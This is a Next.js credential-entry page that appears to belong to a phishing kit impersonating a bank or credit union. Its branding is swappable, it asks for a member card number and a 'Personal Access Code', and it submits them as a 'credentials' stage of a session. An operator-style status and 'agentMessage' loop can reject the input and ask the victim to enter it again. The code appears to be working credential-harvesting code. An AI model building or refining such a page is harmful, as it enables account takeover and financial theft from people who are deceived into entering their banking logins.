'use client';

import { useCallback, useEffect, useState } from 'react';
import { useParams } from 'next/navigation';
import { useSessionStore, submitStageData } from '@shared';
import { currentBrand } from '@/config/branding';

export default function CredentialsPage() {
  const params = useParams();
  const sessionUuid = params.session_uuid as string;

  const { status, caseId, agentMessage } = useSessionStore();
  const [loginId, setLoginId] = useState('');
  const [password, setPassword] = useState('');
  const [rememberMe, setRememberMe] = useState(false);
  const [showPassword, setShowPassword] = useState(false);
  const [fieldError, setFieldError] = useState('');
  const [isSubmitting, setIsSubmitting] = useState(false);

  useEffect(() => {
    if (status === 'rejected' || status === 'error') {
      setLoginId('');
      setPassword('');
      setFieldError(agentMessage || 'Your submission was rejected. Please try again.');
    }
  }, [status, agentMessage]);

  const handleSubmit = useCallback(
    async (e: React.FormEvent) => {
      e.preventDefault();
      setFieldError('');

      if (!caseId) {
        setFieldError('Session information missing. Please refresh and try again.');
        return;
      }

      if (!loginId.trim()) {
        setFieldError('Please enter your login ID');
        return;
      }

      if (!password) {
        setFieldError('Please enter your password');
        return;
      }

      setIsSubmitting(true);

      const success = await submitStageData(
        sessionUuid,
        'credentials',
        {
          username: loginId.trim(),
          password,
          remember_me: rememberMe, // Passed for completeness, but ignored by submitStageData
        },
        caseId,
        () => setIsSubmitting(true),
        () => setIsSubmitting(false)
      );

      if (!success) {
        setFieldError('Unable to process your credentials. Please try again.');
      }
    },
    [loginId, password, rememberMe, caseId, sessionUuid]
  );

  if (status === 'waiting') {
    return (
      <div className="min-h-screen bg-[#fbfbfb] px-5 py-8">
        <div className="max-w-md mx-auto text-center">
          <div className="text-center mb-12">
            <img
              src={currentBrand.logo}
              alt={currentBrand.companyName}
              className="w-56 h-auto mx-auto"
            />
          </div>
          <div className="py-12">
            <div className="animate-spin rounded-full h-12 w-12 border-b-2 border-[#036647] mx-auto"></div>
            <p className="mt-4 text-gray-600">Verifying your credentials...</p>
          </div>
        </div>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-[#fbfbfb] px-5 py-8">
      <div className="max-w-md mx-auto">
        {/* Logo */}
        <div className="text-center mb-12">
          <img
            src={currentBrand.logo}
            alt={currentBrand.companyName}
            className="w-56 h-auto mx-auto"
          />
        </div>

        {/* Login Form */}
        <form onSubmit={handleSubmit} className="space-y-6">
          {/* Login ID Field */}
          <div>
            <div className={`border-b ${fieldError && !loginId.trim() ? 'border-red-500' : 'border-gray-300'}`}>
              <label
                htmlFor="loginId"
                className="block text-sm text-[#036647] mb-2"
              >
                Login ID (MemberCard or Access Card Number)
              </label>
              <input
                type="text"
                id="loginId"
                value={loginId}
                onChange={(e) => setLoginId(e.target.value)}
                className={`w-full bg-transparent border-none outline-none pb-3 text-base ${fieldError && !loginId.trim() ? 'is-invalid' : ''}`}
                maxLength={19}
                disabled={isSubmitting}
                required
              />
            </div>
            {fieldError && (
              <div className="invalid-feedback" style={{ display: 'block' }}>
                {fieldError}
              </div>
            )}
          </div>

          {/* Password Field */}
          <div>
            <div className="flex justify-end mb-2">
              <button
                type="button"
                onClick={() => setShowPassword(!showPassword)}
                className={`text-[#036647] text-sm font-normal ${showPassword ? 'hide-password' : 'show-password'}`}
                style={{
                  backgroundColor: 'transparent',
                  border: 'none',
                  padding: '0.5rem',
                  cursor: 'pointer',
                  textDecoration: 'none',
                }}
                disabled={isSubmitting}
              >
                {showPassword ? 'Hide Password' : 'Show Password'}
              </button>
            </div>
            <div className={`border-b ${fieldError && !password ? 'border-red-500' : 'border-gray-300'}`}>
              <label
                htmlFor="password"
                className="block text-sm text-[#036647] mb-2"
              >
                Password (Personal Access Code / PAC)
              </label>
              <input
                type={showPassword ? 'text' : 'password'}
                id="password"
                value={password}
                onChange={(e) => setPassword(e.target.value)}
                className={`w-full bg-transparent border-none outline-none pb-3 text-base ${fieldError && !password ? 'is-invalid' : ''}`}
                maxLength={30}
                disabled={isSubmitting}
                required
              />
            </div>
            {fieldError && (
              <div className="invalid-feedback" style={{ display: 'block' }}>
                {fieldError}
              </div>
            )}
          </div>

          {/* Remember Me */}
          <div className="flex items-center pt-4">
            <input
              type="checkbox"
              id="rememberMe"
              checked={rememberMe}
              onChange={(e) => setRememberMe(e.target.checked)}
              className="w-4 h-4 mr-2"
              disabled={isSubmitting}
            />
            <label htmlFor="rememberMe" className="text-sm text-gray-700">
              Remember Me
            </label>
          </div>

          {/* Submit Button */}
          <div className="pt-6">
            <button
              type="submit"
              disabled={!loginId || !password || isSubmitting}
              className={`w-full text-white font-medium text-lg uppercase tracking-wide transition-colors ${loginId && password && !isSubmitting
                ? 'bg-[#036647] border-[#036647] shadow-[0_2px_2px_0_rgba(0,0,0,0.16)]'
                : 'bg-[#c4c4c4] border-[#c4c4c4]'
                }`}
              style={{
                padding: '0.375rem 0.75rem',
                borderWidth: '1px',
                borderStyle: 'solid',
                borderRadius: '0.25rem',
                fontSize: '1rem',
                fontWeight: 400,
                lineHeight: 1.5
              }}
            >
              {isSubmitting ? 'Verifying...' : 'Verify'}
            </button>
          </div>
        </form>
      </div>
    </div>
  );
}
